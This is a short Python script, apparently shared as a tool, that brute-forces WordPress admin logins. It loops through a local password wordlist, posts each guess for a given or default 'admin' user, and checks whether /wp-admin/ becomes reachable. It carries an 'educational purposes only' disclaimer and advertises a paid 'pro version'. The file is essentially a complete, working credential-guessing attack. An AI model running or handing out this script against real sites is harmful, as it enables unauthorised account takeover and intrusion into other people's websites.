#IMPORTANT ADVISE!!!!
#This is script is only created as educational proposals,
#don't use anyway without consent of the target you are aiming

# Use a password.lst file in same dir as script, it should be created with
# crunch or some other wordlist generators.

import requests
import sys


banner = "#################################################################\n\
####    pro version? contact me on pmartinezr@proton.me  ####\n\
#################################################################"

print(banner)

if len(sys.argv) == 2:
    print("No login users found, set to default 'admin'")
    log = "admin"
    url = str(sys.argv[1])
if len(sys.argv) <= 1:
    sys.exit("Not enough args you need  almost url and login (default is admin)")
if len(sys.argv) == 3:  
    url = str(sys.argv[1])
    log = str(sys.argv[2])

print(str(sys.argv))
print("URL: " + url)
print("login: " + log)

with open("passwords.lst", 'r') as f:
    passwords = f.read().rsplit('\n')

for password in passwords:
    data = {'log':log,
            'pwd': password
            }
    print("[+]Trying " + log + ":" + password)
     
    with  requests.Session() as s:
        s.post(url, data=data)
        dns = (url.split("/"))[2]
        protocol = url.split("/")[0]
        wp_admin_url =  protocol + "//" +  dns + "/wp-admin/"
        response = s.get(wp_admin_url)
            
    if response is not None:
        if str(response) != "<Response [200]>":
            print(response)
            break
        else:
            if not 'loginform' in response.text:
                print("Password found!!!---> " + log + ":" +  password )
                break
        
